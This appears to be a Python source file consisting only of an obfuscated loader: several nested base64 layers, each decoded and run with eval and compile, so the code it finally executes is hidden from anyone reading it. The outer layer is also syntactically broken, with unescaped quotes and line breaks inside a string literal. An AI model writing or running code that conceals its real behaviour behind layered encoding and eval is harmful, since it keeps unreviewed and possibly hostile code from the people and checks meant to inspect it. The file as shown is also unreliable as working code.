import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVG5wa01Vd3diRFZSYWtwb1ZucEJNbGRzYUc5a01XeFlUbGQwYTFJd1duQlVNalZQWkVac1dWTnFRbWhXZWxaeVYyeGpNVTFGT1hWVmJXaGFZbXMwZDFscVRrSlBWVFZGWTBod2FVMXNiM2RhUldSSFlWZE5lbFZ1V21wU1JFRjNWREkxVDJJeVJsaFhha0pyVFcxNGNscEZaRzVQVlRWRllqQjBTbVZWUmpCVE1tdDNXakZyZVU5WGRHaFdlbFoxVkRKc1EwMVhVa2hYV0ZKUVVUQkdNRk15YTNkVE1YQjFVMjVhYVZVd1NqSlpNR1JYWkZad1dWTnVaRXBTTW5nd1dUQmpOV1ZYVWtSUmJsSnBUV3hLYzFscmFFNWpNR3hJVjI1Q1lWWXphSEpaTTJ3eldqRnNXVkZ1UWtSaVZuQTFXV3BKZDFveVNYcFJiWGhwWWxaYU5Wa3dUVEZpUjFaSVZHMTRhbE5HU25kWmFra3haV3RzU0dKSVVtcFNlbXcxV2tWT1ExWXhiRmhsU0VKaFVqQlpkMWxXWXpWa1ZrcFpVMjVzYVUwd2JIcFRWVnBYWld4d1dWTnJXbXBpYTNBeVdUSmtkMk5IU2xsUmJscHFZbXhHYmxreU1WWlRNa1pZVFZoa2FVMHdiM2RUVldRMFpHeHZlVnBJUW1saVYwNU1XVlpqZUdReVNYcFRha0pLVTBkb01GbHJhRXRrTVd0NVpVaENXbG96UW5SWk1qQTFaRVZzU0U5WVpHRldlbFp6V1RJMVFtUlhVa2hQV0ZwcFUwVXhNVmxzWkhObGJHdzFVVzVDYVZkRlNqSlpNalZTV2pKU1dWUnFRbXBhTTBKdFdXdGpOV0pzYjNsV2JteEtVa1JDYmxscll6VmliRzk1WWtoV1lXVlVWblZYYkdoVFZGZEplVnBITldGWFJXeDJWMFJGTldSV2JGaE5WM2haVFZSb2QxRXlaSGRoYlVwSVVtNXdhbVZWU2xsWlZtaDNZVWRPZEZWc1RtRlhSVXB2V1RJeFIyVldWblJXYlRWTVVucEdNbGRyWkZkak1rNDFUbFpXYW1KVldqRlpla3B6WWtkS2RWVnJOV2xOYkVweldXdE9jazVyVG5CUlYyUktVVEJLYlZsdE1VZGtSbkJVVVZSc1NsRXlVWHBaVm1oM1lVZE9kRlZ0V21waVZsb3pWMVpvUzJGSFRuTlBXR3hoVmpKT2RWRXliRUphTUd4RVVWVjBTbEV3Um01VFZXTTFaREZyZVdKSVdtbGhWVVUxVTFWa1lXTkdjRmhsUjNScVpWUldWVmRzWkRSaVJtdDZWVzVDYVUxcVVuWldNMnh1WW1zeFJWSlhOVTFSTUVsNFUycEdTMkpIVGtoU2JteGFWMFZzYmxscmFGZGliR3haVTIxNGFtVlZTbkpYYkU1RFpGWnNXRlJ1UW1sV01uaHpXVzAxVTJScmNEVmhNMDVaVVZjNWJsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVXakkxVGxKRmJIVlVSVTVEVFZWdmVGTnRlR3BTTUZvMVYxWm9TbG95VGtoU2JYUnFZbGQ0TVZscVRrNWlhM1JVWlVkT1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3U210VVJVNXJWVWRPU1ZWdVFtbE5hbFkyVTI1c2NsTXdUbkJSVjJSS1VUQktRbGRXYUVOalJYaDBUMWhXWVZWWE9XNVRWVTVDV2pGd1NGWnRNVXBTTURWdldUSXhhMkZIVG5OUFYzUmFWMFpLTWxremJHOWxiSEJZWlVjeFRGWkhPVXhUVlU1Q1dqQnNSRkZYWkVwUk1FbzJWMVprVDJWV2JGZFBWMnhhVjBaWmQxbFdhRTlrUjBvMVVWUnNTbE5GTlhOWmEyUmFaRlp3V0U1VVNsaGxWMUkyVjFaa1QyVldiRmRQVjJ4YVYwWlpkMWxXYUU5a1IwbzFXa2RTUkdGVlJtNVRWVTVDV2pCc1JGRlhaR3BOYTFweFdUSXhSMXB0U2xoU2FrSnFZbGQ0TUZscVNURmpSMG8xVVZSc1NsTkZOWE5aYTJSYVpGWndXRTVVU2xobFYxSTJWMVprVDJWV2JGZFBXRkphVjBaS05WbFdZM2hrYlVwMFlraGFTMDFVUWt4VFZVNUNXakJzUkZGWFpFcFJNRW8yVjFaa1QyVldiRmRQV0hCcFRXNW9kMWRVU25OTlJtZDVVMjFvYTFkR1NuZFpla2w0Wkd0c1JVMUhaR3BOYkZwNlYyMXJNV0pIU25WWGJVcExUVEExYjFkVVRrdGhSbWQ2Vkc1YWFWSXllSEZaVm1oVFdteHNkRkpxUm10U01uZzJXV3hqTkdKc2FGSmlNbVJLVVRCR2JsTlZUa0phTUd4SlZHMW9XazB3Y0c5WFJFNURZa2RPZFZSdVdtbGlWVlp1VlVaT1EyVnNjRmhsUnpGTllsWmFNVnBIZUhwaWJVMTVVbTF3YW1KVldtMVpNR1JYWlZkTmVVOVlWbHBWTWxKclVUSnNRbG93YkVSUlYyUktVVEJHYmxsV1pGcGFNazE1Vm01T1lXRlVWakpaTUdSUFkwZEplVTVIWkZGV1JFSnVVMWR3UW1WVmJIRmlNSFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01WFZ6RkhUVmRTU0dKSWNHbFdlbXcyVTFWUmQxb3lUWGxTYlhCcVlsVmFiVmRYTVVkTlYxSklZa2h3YVZaNmFERlpla3BYWVVkT2RGUnRPVXhTYmxKclV6RkdkbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVcweGFVMHdiRzVYVjJ4RFkwZEtjRkZ0YkZwWFJsbDNXVlpvVDJSSFNYcFVWRnBFWVZWR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGdVFtRmhWVXB3VkVjMVEyRkdjRWxUYmtKcFlsUm9ibGRXWXpGaE1HeElUbGhhYTFFd1NuQlVSelZEWVVad1NWTnVRbWxpVkd4dFdUQmtWMlZYVFhsUFdGWmFWa2M1VEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTJReGNGbFRWMlJSVlRCS05sZFdaRTlsVm14WFQxaGtZVmRGY0RaWmFra3hZVVY0ZEZSdWJHRldNRmwzVjJ4T2IwNHdiM2xPV0ZwcFZqQndOVmRzVG1wT2JHeHdUbGhrV2xZeFNqVlpWbU14Wkd4a05tSjZRbEJXYWtKNlUycE9UMkpIVmtoUFJ6VlFZVmRTVDFkV2FFOWhiVkpZWlVoQ2FXSlVhSFZhYkU1eVV6QnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXMXNUV0pyU205WGEyaExZMGRLZEU5WFdtcFNNVm8xV1hwSk5XUldiRlJSVkd4S1UwVktjMWt5YXpGalJuQkNZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG95UmxoWFYyUmFZVlJXTUZkV1pGTmxWMFpZVGxkb1NsSXdXakZYYTA1RFpGZEplbFZYWkZwaFZGWXdWMVprVTJWWFJsaE9WMmhaVFRCS2Mxa3lOVTlrYlVwMFVsUmFSR0ZWUm01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibGt3WkZkbFZXeEZUVWRrYWsxclduRlpNakZIV20xT1NGWnViR3BOYW13eFYxWk5NV0Z0VG5SV2JXaHJVakZXZGxwWWJHdGtWMGw1VFZkc2FtSldWblZVTWpGS1pGZEtXRkp0ZEdwaVYzZ3hWMVphZWs1ck5VVmlSMUpOVVRCR2RWbDZTbGRPUjBvMVdYcGFTMDFHY0hOWmJHUlhaRmRHV0U1WVdrdE5la0ozVVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pGc2NFNVlVbHBXTVVvMVdWWmpNV0ZHWjNwUmJYaHFZbXMxTWxsdE1VWmFNVUpVVVc1a1lWZEZiREZaVm1SU1V6Qk9jRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVTBVMWNGZFdhRmROUjBaWlZHNVNhVTB3TVc1VlJrNURaV3hzV0ZSdWJGcFdhbXcyV1dwS05HTkdhM2xpUkVKWlRXdHdiMXBHYUZOalIwMTVUVmhhVFdKck5YTlhWbWhMWVcxR1JHRkhTbGxWTW5STVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNWEIwVDFoc1NsSXdiRzVaVm1Nd1dqSk5lVk50YUd0WFJrcDNXWHBKZUdSdFRqWmlNSFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzU0dKSE1VcFNNR3d4V1RCa1IyRXlUblJpU0ZacFpWVktiMWx0TVZKYU1rcDBUMVJDU2xJd2JERlpNR1JIWVRKT2RHSklWbWxOVkd3elYyeG9TMlZ0U1hsT1YyaFFXakk1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZvUTJKSFRuQlJWR3hLVTBVMWIxZFVUa3RoUm1kNlVXMTRhbUpyTlRKWmJURkdaRlpyZWxOdGVGcFhSa3B6VXpCb2VtSnRTblJQV0ZKYVltdHdjMU51Y0hkaFZYaDFVVzFvWVZORmNIZFpiVEExV1dzNWNWVlVWbGxWTTJSdVUycE9UMkpIVmtoUFJ6VlFZVmRTVDFkV2FFOWhiVkpZWlVoQ2FXSlVhSFZhYkU1eVV6QnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXMXNUV0pyU205WGEyaExZMGRLZEU5WFdtcFNNVm8xV1hwSk5XUldiRlJSVkd4S1UwVktjMWt5YXpGalJuQkNZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG95UmxoWFYyUmFZVlJXTUZkV1pGTmxWMFpZVGxkb1NsSXdXakZYYTA1RFpGZEplbFZYWkZwaFZGWXdWMVprVTJWWFJsaE9WMmhaVFRCS2Mxa3lOVTlrYlVwMFVsUmFSR0ZWUm01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibGt3WkZkbFZXeEZUVWRrYWsxclduRlpNakZIV20xT1NGWnViR3BOYW13eFYxWk5NV0Z0VG5SV2JXaHJVakZXZGxwWWJHdGtWMGw1VFZkc2FtSldWblZVTWpGS1pGZEtXRkp0ZEdwaVYzZ3hWMVphZWs1ck5VVmlSMUpOVVRCR2RWbDZTbGRPUjBvMVdYcGFTMDFHY0hOWmJHUlhaRmRHV0U1WVdrdE5la0ozVVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pGc2NFNVlVbHBXTVVvMVdWWmpNV0ZHWjNwUmJYaHFZbXMxTWxsdE1VWmFNVUpVVVc1a1lWZEZiREZaVm1SU1V6Qk9jRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRBMU0xbHFTVEZpYlVvMVVXNU9hVTB3TVc1Wk1HUkhZVEpPZEdKSVZtbE5NREZ1VjJ0a1Zsb3lTa2hQV0hCS1VucEdiMXBGYUV0alIwcFlUMWhXYUZaNmJEWlRWV1JYWkZWc1NHVkhhRXBUUmtwdlYxY3hOR0ZGYkVsUmJYaHFZbXMxTWxsdE1VWmFNa1pJVW1wV1NsTkZWbTVaYTJoWFlrWnZlVTlIWkdwU2Vtd3hWMnhvU2xveGNGbFVha0pwVFRBeGJsZFVTa2RrUjA1SVQxaHdTbE5GY0hOWmEyUkhUVVp3V0ZWVmRFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibGxzWkVkTlIwNTBZa2hTYVUxcVZuZFphazVPV2pGQ1ZGRnVjRnBXTURVMVYxWlpOV1JHYkZsVmJteG9WbnBHTWxsdE1YTmthM2gxVkcxNFdsZEZjSEZaVlU1dldXeG9WR0V3ZEVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsZHRNRFZsVld4SVRVZGthRlo2VW01WmJHUkhUVWRPZEdKSVVtbE5hbFozV1dwT1RrNXJUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVEWTBad2NGRnVVazFpVkZZeVdXeGtTMlZXY0ZkUFdHUmFWakZLTlZsV1l6RmthMnhJVW01V1lWRXdTakZaYWs1U1dqSktWRTVZWkZwV01VbzFXVlpqTVdSck9XNWlNbVJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFRSVXB6V1RKc1FrOVZiRWxVYldoYVRUQndiMWRFVGtOaVIwNTFWRzVhYVdKVlZqRlhWRTVMWWtac1dWVnRlRXhUU0U1TVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPYTJSWFNYbE5WMnhxWWxaV2RWUXlNSGRrVjBwMFQxaFNXbUpyY0hOWFJFNURZVVp3U1ZOdVFtbGlWR2g2VVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbUpzYkZsUmJYaHBVak5vZDFkcll6UmxSWEEyWTBoU1RXSlZXak5YYkdRMFl6SkdXRlZ1V2s1V2Ftd3pWMVprVTJWWFJsaE9XRnBOVVZjNWJsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5xU2tka01YQllaVWhPYUZZeFNqSlVWMnhxVG0xS1ZFNVhhR3BTTVZwNldXdGtjMkV5U2paVGJWcHFVakJhY2xreU1YTmtWMG8xWkRCMFNsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV5VWpaWGJHaHZaR3R3Tm1JeU5WVldNRm8yVjFST1YyTXlSbGhPV0ZwTFRYcENkMUV5YkVKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG95U2xST1dHUmFWakZLTlZsV1l6RmthMnhGVFVka2FsSXhXalZVUnpGellUQk9jRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa05qUm5Cd1VXNVNUV0pVVmpKWmJHUkxaVlp3VjA5WVVscFdNVW8xV1Zaak1XRkZiRWhTYmxaaFVUQktNVmxxVGxKYU1rcFVUbGhTV2xZeFNqVlpWbU14WVVVNWJtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsTkZTbk5aTW14Q1QxVnNTVlJ0YUZwTk1IQnZWMFJPUTJKSFRuVlVibHBwWWxWV01WZFVUa3RpUm14WlZXMTRURk5JVGt4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVyWkZkSmVVMVhiR3BpVmxaMVZESXdkMlJYU25SUFdGSmFZbXR3YzFkRVNYaGhSbkJKVTI1Q2FXSlZWbnBSTW14Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNZbXhzV1ZGdGVHbFNNMmgzVjJ0ak5HVkZjRFpqU0ZKTllsVmFNMWRzWkRSak1rWllWVzVhVGxacWJEQlhWbVJUWlZkR1dFNVhhRTFSVnpsdVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMnBLUjJReGNGaGxTRTVvVmpGS01sUlhiR3BPYlVwVVRsZG9hbEl4V25wWmEyUnpZVEpLTmxOdFdtbFdNRnB5V1RJeGMyUldiRlJrTUhSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEpTTmxkc2FHOWthM0EyWWpJMVUySldXakJYYkdNeFkwZEtkRTlITlcxVk1uUk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNURaRVY0ZEUxWGFHRlRSWEIzV1cweFJsb3hRbFJSYm1SaFYwVnNNVmxXWkZKVE1FNXdVVmRrU2xFd1JtNVRWVTVDV2pKR1dGZFhaR3BOYkZwNlYyMXJNV1J0VGtoVWJrSnBUV3BTYmxWR1VYZGFNR3h4VVZob1NtRnRPVzVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGthVk5HV25WWFZtaExXbTFLZEZKdGNHaFdla1ozVjJ4ak1VMUhTalZSVkd4S1UwVTFjMWxyWkZwa1ZuQllUbFJLV0dWWFVucGFSbVJyWVVkT2MwOVlWbHBXTURWM1dXeGtjMkpIU25WVmJscExUVlJDVEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqSk9TRlp1YkdwTmFtd3hWMVpvVGxveFFsUlJibkJhVmpBMU5WZFdXVFZrTVhCWlUyNXdhVTFxVm05VVJ6VlBZa1pzV1ZOdGNHaFJNbWhwVjBaT2NsTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrWVdKVWJEVlRWV2hDV2pKR1dFNUhaR3BTTVZvMVdYcEpOV1JXYkZsVVZGcEVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZ1UW1GaFZVb3pWRWN4TkUxV2IzbFNibXhaVFdwV2IxZFliRU5oUjBwMFZWZGthV0pVYTNkVFZXaENaRmRLU1ZadE5WcFhSWEJ0V1cweFIyRnJNVlZpTUhSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVwNldXMXNRazlWYkVobFJFWmhUV3RhTlZkRVNURmhSbXQ1WWtoU2FGWXhXakZhUldNMFpGWnJlbE50ZUZwWFJrcHpVekJvZW1KdFNuUlBXRkphWW10d2MxTnVjSGRrTUhoMFpVUkdZVTFyV2pWWFJFa3hZVVpyZWsxSVFrUmhWVVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVpNRTB4WXpKU1dGcEhhR3BpUkd3eFYxWmtUbVZGYkVWTlIyUnBVbnBTTVZsV1pGSlRNR3hFVVZka1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZqZUdGSFVrbFRia0pwVm5wc01WbFdZelZsYTJ4RlRVZGthazFyV25GWk1qRkhXbTFLV0ZKcVFtcGlWM2d3V1dwSk1XTkhTalZPV0hCaFZqQmFOVmRVU201aU1XTjRUVWhDUkdGVlJtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVmtZV1J0VG5CUmJsSktVako0TVZOVlkzaGhSMUpKVTI1Q2FWWjZiREZaVm1NMVpXczVibUl5WkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTWtaWVYxZGthVlY2Vm5wYVJtUnJZVWRPYzA5WVZscFdNRFZ0VjJ4b1QyUXlTWHBVYldoS1VqQmFNVmRyVGtOa1YwbDZWVmRrYVZWNlZucGFSbVJyWVVkT2MwOVlWbHBXTURFMFYwUktWMlZ0VGtoUFdIQmFWa2M1VEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTJNeVNuQlJWR3hLVWpObmVGZHFTa2RsVm1kNVRsZG9XazF0ZURCWlZtUlhaRmRTU0U5SVZscE5NSEJ6VjFab1UySkZkRWxqTWpWcFlsUnNNRmRYTlV0aVJYQTJZMGhTVFdKWVozaFhha3BIWlZabmVVNVhhRnBOVkd4eldYcE9RMlJ0VFhsU2FteE1WVmM1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZqZDJSWFNrbFdiVFZhVjBWd2JWbHRNVWRoYXpGWFQxZDRhazB3U2pKWmVrcEdXakZDVkZGdVRtbGhWRlozVjJ0R2Rsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVpWbVJhV2pKS1ZFNVlaRmxOYm1kNFYycEtSMlZXWjNsT1YyaGFUVlJzYzFsNlRrTmtiVTE1VWxka1dsWjZWbkpUVldNeFpHMVNSRkZ1VWsxaWEwcHRXV3RvVjJKc2JGbFRiVnBwWWxWYWNWUldXVFZpUjAxNlVXNWFhazFyVlRKUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1rcElUa2RrVVZVd1NucGFSbVJyWVVkT2MwOVlWbHBXTURWM1dXeGtjMkpIU25WVmJscE5ZbFUxTlZkc1pFZE5SbkJVWVVSa1MwMXFWakpaYkdSTFpWWndWRmw2V21sVmVsWXpWMFJLTkUxV2IzbFNibXhaVFdwV2IxZFVSVFZpUjAxNlVXNWFhazFyV1RWVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeElUVWhXYWxKcWJIcGFSbVJyWVVkT2MwOVlWbHBXTURFMFYwUktWMlZ0VGtoUFdIQmFWVEJGTlZOVlpEUmtWWGgwWWtkMFNsRXdSa3hUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVWpKNGRGTlZZM2RrVjBwWFQxaE9hMVl5VW05Wk1uYzFaRlpzV0ZSdFdtRlhSVFV6V1dwT1QyRkZiRWhTYmxaaFVUQktNVmxxVGxKYU1rcFVUbGhTV1UxdVozaFhha3BIWlZabmVVNVhhRnBsYTFwdFYyeG9UMlF5U1hwVWJXaFFXakk1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZrTkdSVmJFVk5SMlJwVTBaYWRWZFdhRXRhYlVwMFVtMXdhRlo2Um5kWGJHTXhUVWRLTlU1WGNHcGlWbHB2V2tWa1ZtSXlWalZhU0ZacFRXcEdjRmt5TVZaaWF6bDBUVWhXYVZacWJIcGFSbVJyWVVkT2MwOVlWbHBXTURWdFYyeG9UMlF5U1hwVWJXaHRWVEowVEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTJSRmVIUk5WMXBwVTBaYWRWZFdhRXRhYlVwMFVtMXdUbFpxYkhOWmVrNURaRzFOZVZKWFpGRlZNRXA2V1cxck1XTkdjRUppTW1SS1VUQkdibE5WVGtKYU1HeEVVVlF3YVVOdFZqSlpWM2R2V1RJNWRHTkhiSE5hVTJocFdWaE9iRTVxVVhWWmFsa3dXa2RXYW1JeVVteExSemxRVkhwQ2RtSXlPVkJVZVd0elNVTkpPR016VW5saFZ6VnVVR2xKYzBsRFpHeGxSMVpxU25scmNDSUtaWFpoYkNoamIyMXdhV3hsS0dKaGMyVTJOQzVpTmpSa1pXTnZaR1VvYjA5UE1HOXZiMDlQS1N3Z0lqeHpkSEpwYm1jK0lpd2dKMlY0WldNbktTaz0iCmV2YWwoY29tcGlsZShiYXNlNjQuYjY0ZGVjb2RlKG9PTzBvb29PTyksICI8c3RyaW5nPiIsICdleGVjJykp"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))